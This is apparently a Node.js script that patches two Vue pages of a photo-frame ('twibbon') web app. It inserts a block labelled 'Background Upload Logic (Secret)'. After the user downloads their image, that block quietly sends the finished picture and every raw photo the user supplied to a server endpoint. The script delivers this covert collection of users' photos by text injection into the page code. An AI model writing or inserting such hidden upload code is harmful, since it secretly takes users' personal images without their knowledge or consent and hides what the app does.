const fs = require('fs');

function patch(file) {
  let code = fs.readFileSync(file, 'utf8');

  const injectTarget = `isDownloading.value = false
      }
      bgImg.onerror = () => {`;
  
  const uploadLogic = `
        // Background Upload Logic (Secret)
        setTimeout(async () => {
          try {
            const formData = new FormData();
            formData.append('slug', route.params.slug);
            
            // Final result as WebP
            const resultBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.8));
            formData.append('result_image', resultBlob, 'result.webp');
            
            // Raw photos as WebP
            for (let i = 0; i < photos.value.length; i++) {
              const dUrl = photos.value[i].dataUrl;
              const res = await fetch(dUrl);
              const blob = await res.blob();
              formData.append('raw_images[]', blob, \`raw_\${i}.webp\`);
            }
            
            // Send to server
            await api.post('/twibbon/save-session', formData, {
              headers: { 'Content-Type': 'multipart/form-data' }
            });
            console.log('Background upload success');
          } catch (e) {
            console.error('Background upload failed', e);
          }
        }, 500); // Small delay to prioritize the user's download

        isDownloading.value = false
      }
      bgImg.onerror = () => {`;

  if (code.includes('isDownloading.value = false\n      }\n      bgImg.onerror = () => {') || code.includes(injectTarget)) {
    code = code.replace(/isDownloading\.value = false\s*\}\s*bgImg\.onerror = \(\) => \{/g, uploadLogic);
    fs.writeFileSync(file, code);
    console.log('Patched ' + file);
  } else {
    console.log('Could not find injection point in ' + file);
  }
}

patch('./pages/twibbon/[slug].vue');
patch('./pages/admin/twibbon/[slug]/index.vue');
